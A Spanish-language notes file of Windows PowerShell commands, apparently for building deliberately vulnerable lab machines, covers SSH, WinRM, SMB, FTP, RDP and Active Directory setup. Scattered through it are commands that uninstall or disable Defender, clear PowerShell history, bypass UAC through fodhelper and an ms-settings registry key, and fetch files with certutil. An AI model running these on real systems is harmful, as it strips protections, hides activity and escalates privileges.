
Desinstalar defender:
Abrir powershell ISE -> Uninstall-WindowsFeature -Name Windows-Defender


Permitir ejecutar .bat:
Set-ExecutablePolicy Unrestricted


Instalar ssh:
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0



net user Administrador /active:yes
net user Administrador password -> se guarda la config del Admin.   

Crear grupo y añadir usuario:
net localgroup group_name /comment:"text" /add
net localgroup group_name user /add 


Permisos de archivos:
https://blog.netwrix.com/2018/04/18/how-to-manage-file-system-acls-with-powershell-scripts/

Ver permisos archivo:
get-acl \\fs1\shared\sales | fl


Añadir en un archivo un grupo en seguridad:
$acl = Get-Acl path\file
$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("group_name","ReadAndExecute","Allow")
$acl.SetAccessRule($AccessRule)
$acl | Set-Acl path\file

//https://blog.netwrix.com/2018/05/03/differences-between-share-and-ntfs-permissions/

Si hay cambios, reiniciar terminal.

Desactivar antivirus en tiempo real:
Set-MpPreference -DisableRealtimeMonitoring $true

Winrm:
Añadir usuario grupo Winrm:
net localgroup "Usuarios de administración remota" prueba /add

Activar winrm:
Enable-PSRemoting -SkipNetworkProfileCheck

Desactivar winrm:
Stop-Service WinRM 

Configurar winrm:(solo con este ya puedo conectarme como admin)
winrm quickconfig -Force

Guardar maquinas en TrustedHosts:
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "IP, Ip, ..."
Get-Item WSMan:\localhost\Client\TrustedHosts
Confiar en todas las maquinas:
Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force


----SMB----
(Usar dos usuarios, uno para smb y otro para conectar por ssh, winrm,...)
Activar/desactivar smb en caracteristicas(necesita reiniciar):
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart

Set-SmbServerConfiguration -EnableSMB1Protocol 1/0 -Force

Activar que clientes puedan conectarse por smb:??
Set-SmbServerConfiguration -AuditSmb1Access $true -> no hace falta, probar a desactivar y volver a activar, a ver si funciona


Por que con smbap puedo descargar pero con smbclient no me puedo conectar???


Crear carpeta compartida:
New-SmbShare -Name "folder" -Path "path\folder" -FullAccess "Administrador" 


Añadir usuario a carpeta comaprtida con privs de lectura:
Grant-SmbShareAccess -Name "folder" -AccountName "user_name" -AccessRight Read -Force


SNMP:
https://4sysops.com/archives/set-up-snmp-on-windows-server-2016/
http://woshub.com/install-configure-snmp-service-windows/
https://theitbros.com/snmp-service-on-windows-10/
Instalar snmp:
Add-WindowsCapability -Online -Name "SNMP.Client~~~~0.0.1.0"

Iniciar\reiniciar servicio:
Start\Restart-sercive snmp

Habilitar conexion pc:
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\SNMP\Parameters\PermittedManagers"  -Name 2 -Value IP

Crear community:(Value-> READ ONLY: 4, REAAD WRITE:8, NONE:1, NOTIFY:2, READ CREATE:16)
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\SNMP\Parameters\ValidCommunities" -Name name -Value 4

Ver reglas firewall:
Get-NetFirewallRule -DisplayName *snmp* | ft

Desactivar estas reglas:
Get-NetFirewallRule SNMP-Out-UDP-NoScope | Disable-NetFirewallRule
Get-NetFirewallRule SNMP-In-UDP-NoScope | Disable-NetFirewallRule
Get-NetFirewallRule SNMP-Out-UDP | Disable-NetFirewallRule
Get-NetFirewallRule SNMP-In-UDP | Disable-NetFirewallRule

FTP:
Enable ftp server:(hace falta estar en NAT)
Enable-WindowsOptionalFeature -Online -FeatureName IIS-FtpServer -All

Crear servidor ftp y configurar:
mkdir C:\ftp_server
#Crear archivo
Crear servidor:
New-WebFtpSite -Name "ftp_server" -Port "21" -PhysicalPath 'C:\ftp_server\' -Force

Crear solo en local:(Pero se ve con nmpa)
New-WebFtpSite -Name "ftp_server" -Port "21" -PhysicalPath 'C:\ftp_server\' -IPAddress '127.0.0.1' -Force


Desactivar ssl:
Set-ItemProperty "IIS:\Sites\ftp_server" -Name ftpServer.security.ssl.controlChannelPolicy -Value 0
Set-ItemProperty "IIS:\Sites\ftp_server" -Name ftpServer.security.ssl.dataChannelPolicy -Value 0

Habilitar conexion anonymous user:
Set-ItemProperty "IIS:\Sites\ftp_server" -Name ftpServer.security.authentication.anonymousAuthentication.enabled -Value $true

Habilitar conexion usuario:
Set-ItemProperty "IIS:\Sites\ftp_server" -Name ftpServer.security.authentication.basicAuthentication.enabled -Value $true

Dar permisos escritura y lectura:(se puede cambiar los permisos y en users se puede poner uno en concreto, pero no anonymous)
Add-WebConfiguration "/system.ftpServer/security/authorization" -value @{accessType="Allow";roles="";permissions="Read,Write";users="*"} -PSPath IIS:\ -location "ftp_server"


SSH por id_rsa:
mkdir ~/.ssh
ssh-keygen -q -t rsa -N "password" -f id_rsa
mv id_rsa* ~/.ssh(se puede ahcer en un comando?? no me sale, debeira poderse)

Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
ssh-keygen -q -t rsa -N "password" -f id_rsa (hacer como usuario username)
mkdir C:\Users\username\.ssh\ (hacer como usuario username)
mv id_rsa* C:\Users\username\.ssh\ (hacer como usuario username)
set-service ssh-agent -StartupType ‘Automatic’
Start-Service ssh-agent
ssh-add C:\Users\username\.ssh\id_rsa (hacer como usuario username)como hacer sin tener k meter el prompt??????
Start-Process powershell.exe "ssh-add C:\Users\prueba\.ssh\id_rsa" 


echo 'PubkeyAuthentication yes' | Add-Content C:\ProgramData\ssh\sshd_config
echo 'StrictModes no' | Add-Content C:\ProgramData\ssh\sshd_config
cp C:\Users\username\.ssh\id_rsa.pub C:\Users\username\.ssh\authorized_keys



Task scheduler:(mirar si usuario prueba puede ejecutar cuando funcione con admin)
$action=New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NonInteractive -Nologo -NoProfile -Execution Bypass -File "C:\Users\script.ps1"'
$trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(60) -RepetitionInterval (New-TimeSpan -Minutes 1)
$settings=New-ScheduledTaskSettingsSet
$task=New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
Register-ScheduledTask -TaskName "ejemplo" -InputObject $task -User "administrador" -Password "hola"

//Enable-ScheduledTask -TaskName "ejemplo"
//Start-ScheduledTask -TaskName "ejemplo"

En principio ejecutando solo eso como admin funciona, pero solo a veces...
Set-Content C:\Users\daniel\lalala.bat 'echo hola >> C:\Users\daniel\log.txt' 
schtasks /create /TN nombre /TR C:\Users\daniel\lalala.bat /SC MINUTE /F /RU Administrator /RP 'pass' 
schtasks.exe /RUN /TN "nombre_task"

Rdesktop
https://exchangepedia.com/2016/10/enable-remote-desktop-rdp-connections-for-admins-on-windows-server-2016.html
Activar:
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0
Desactivar seguridad en red:
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\' -Name "UserAuthentication" -Value 0
Conectar con usuario que no sea admin
net localgroup "Remote Desktop Users" username /add

Borrar historial:
Remove-Item (Get-PSReadlineOption).HistorySavePath


Carpeta de inicio:
Common: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
User startup folder: C:\Users\Administrador\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp

icacls -> para privilegios en archivos


Ejecutar script en maquina:
$uaser = "username"
$pass = ConvertTo-SecureString -String "pass" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $pass
Invoke-Command -Authentication Negotiate -ComputerName IP -Credential $Credential -ScriptBlock { path\script.ps1 }


Get-Process:
get-Process -IncludeUserName -Name "name*" 
Obtener path script:
(Get-Process -Name name).path
Solo saca los .exe, hacer un .exe y en el mismo path el ps1 para ver el codigo.


Guardar credenciales en el Manage Credentials:
cmdkey.exe /add:username /user:username /pass:pass

https://theitbros.com/enable-saved-credentials-usage-rdp/
gpedit.msc -> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options



UAC bypass: https://gist.github.com/xillwillx/39e5cccc846d5b5a475bbad48216a5a7
reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f 
reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d "cmd /c start powershell.exe" /f

Si no funciona se puede hacer a mano:
    - Tecla windows + registry editor
    - Creamos el path: HKCU\Software\Classes\ms-settings\shell\open\command, para crear una carpeta darle a new key 
    - En el item default poner: cmd /c start powershell.exe
    - Crear nuevo string y darle el nombre: DelegateExecute
Ejecutar -> fodhelper.exe


Crear Symbolic/hard links:
New-Item -ItemType SymbolicLink -Path "Link" -Target "Target"(necesita ser admin)
New-Item -ItemType HardLink -Path "Link" -Target "Target" -> New-Item -ItemType HardLink -Path "C:\prueba2\link.ps1" -Target "C:\test\prueba1.ps1"

Obtener usuario de un proceso:
Get-process
get-process -Name "asg*"
Get-CimInstance Win32_Process -Filter "name = 'notepad.exe'"
$proc = Get-CimInstance Win32_Process -Filter "name = 'notepad.exe'"
Invoke-CimMethod -InputObject $proc -MethodName GetOwner


Descargar archivos con certutil:
certutil -urlcache -split -f http://IP:PORT/file



Active Directory(AD)

Instalar modulo AD:
Get-WindowsCapability -Name RSAT.ActiveDirectory* -Online | Add-WindowsCapability -Online

Añadir usuario Ad desde DC:
$password = ConvertTo-SecureString "pass" -AsPlainText -Force
New-ADUser -Name "Full name" -SamAccountName "name" -AccountPassword $password -Enabled $true

Añadir IP Servidor DNS:
netsh interface show interface

netsh interface ipv4 set dnsservers "Interface Name" static IP primary //Interface Name = Ethernet
netsh interface ipv4 add dnsservers "Interface Name" IP index=2
or 
Set-DnsClientServerAddress -InterfaceIndex 6 -ServerAddress "IP, second_IP"


Añadir usuario AD:(Hay que reiniciar)
$pass = ConvertTo-SecureString "$password_rand1" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PsCredential("username", $pass) 
Add-Computer -DomainName genwin.local -Credential $credential

Cambiar politica de contraseñas para un dominio:
Set-ADDefaultDomainPasswordPolicy -Identity dominio -MinPasswordLength 2 -ComplexityEnabled $false

Añadir usuario AD a un grupoAD:
Add-AdGroupMember -Identity "grupo" -Members "username"









LINUX(en powershell):
Conectar:
Enter-PSSession -ComputerName IP -Authentication Negotiate -Credential administrator 

Tranferir archivos:(alguna de forma de poner la pass en el comando??)
Copy-Item -Recurse -Path /home/daniel/Escritorio/github/vulnerabilidades/I1/script/ -Destination 'C:\' -ToSession (New-PSSession -Authentication Negotiate -ComputerName 192.168.56.30 -Credential administrator)
